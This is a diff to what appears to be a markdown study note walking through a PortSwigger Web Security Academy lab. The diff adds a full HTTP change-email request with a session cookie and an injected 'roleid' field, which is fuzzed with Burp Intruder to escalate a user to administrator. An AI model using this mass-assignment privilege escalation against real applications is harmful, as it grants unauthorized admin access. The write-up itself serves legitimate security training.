@@ -202,10 +202,20 @@ x=1
 <sub>Capture current logged in user email submission request and send to Intruder, then add "roleid":§99§ into the JSON body of the request, and fuzz the possible roleid for administrator access role.</sub>  
 
 ```html
-POST /
+POST /my-account/change-email HTTP/1.1
+Host: 0a25007604813b07c2066cf20023004d.web-security-academy.net
+Cookie: session=vXAA9EM1hzQuJwHftcLHKxyZKtSf2xCW
+Content-Length: 48
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Connection: close
 
-
+{
+ "email":"newemail@wiener.peter",
+ "roleid": 2
+}
 ```  
+
 ![Intruder Payload set to identify Admin role ID](intruder-payload-positions.png)  
 
 >Attack identify the possible role ID of administrator access role and then send this request with updated roleId to privile escalate the current logged in user to role of administator of target.  
@@ -213,6 +223,4 @@ POST /
 ![Attack identify Admin role ID](admin-roleid-privesc.png)  
 
 [PortSwigger Lab: User role can be modified in user profile](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)  
-
-
 
